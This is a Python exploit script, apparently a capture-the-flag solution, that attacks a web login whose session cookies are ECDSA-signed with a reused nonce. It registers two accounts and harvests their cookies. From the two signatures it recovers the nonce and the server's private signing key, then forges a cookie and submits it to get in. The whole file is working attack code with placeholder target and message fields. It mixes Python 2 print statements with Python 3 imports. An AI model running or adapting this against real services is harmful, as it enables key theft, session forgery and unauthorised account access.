#!/usr/bin/env python
import requests
import random
import base64
import hashlib
try:
    from urllib.parse import urlparse
    from urllib.parse import unquote
except ImportError:
    from urlparse import urlparse
    from urlparse import unquote
from datetime import datetime
from ecdsa import SECP256k1, util, SigningKey, VerifyingKey
from ecdsa.numbertheory import inverse_mod
from ecdsa.util import sigencode_der

from hashlib import sha256

n = SECP256k1.order

url = "<<URL>>" # edit here

def generateCookies():
    username = int(random.random() * 10000000000000000)
    password = username
    data1 = {'username':username,'password':password}
    data2 = {'username':username-1,'password':password-1}

    response1 = requests.post(url,data=data1,allow_redirects=False)
    response2 = requests.post(url,data=data2,allow_redirects=False)

    response_list=[response1.cookies,response2.cookies]
    cookie_list = []
    for cookies in response_list:
        for cookie in cookies:
            cookie_list.append(cookie.value)
    return cookie_list

def exploit(cookie_list):
    m1, sig1 = base64.b64decode(unquote(cookie_list[0]).encode()).split(b'--')
    r1, s1 = util.sigdecode_der(sig1, n)
    z1 = util.string_to_number(sha256(m1).digest())

    m2, sig2 = base64.b64decode(unquote(cookie_list[1]).encode()).split(b'--')
    r2, s2 = util.sigdecode_der(sig2, n)
    z2 = util.string_to_number(sha256(m2).digest())
    
    if r1 == r2:
        print "EXPLOITABLE: ", r1
    
    k = (((z1 - z2) % n) * inverse_mod(s1 - s2, n)) % n
    print "k: 0x{:x}".format(k)
    
    dA = ((((s1 * k) % n) - z1) * inverse_mod(r1,n)) % n
    print "dA: 0x{:x}".format(dA)

    private_key = SigningKey.from_secret_exponent(dA, curve=SECP256k1)
    message = "<<input message>>" # edit here
    sk = SigningKey.from_pem(private_key.to_pem())
    sign = sk.sign(message,hashfunc=hashlib.sha256,sigencode=sigencode_der,k=k)
    cookie = base64.b64encode(sign)

    cookie_string = str(cookie)
    cookies = {'secure':cookie_string}
    data = {'username':m1,'password':m1}
    r = requests.post(url,cookies=cookies,data=data)
    
    if "You are not logged in" not in r.text:
        print r.text

if __name__ == "__main__":
    cookie_list = generateCookies()
    exploit(cookie_list)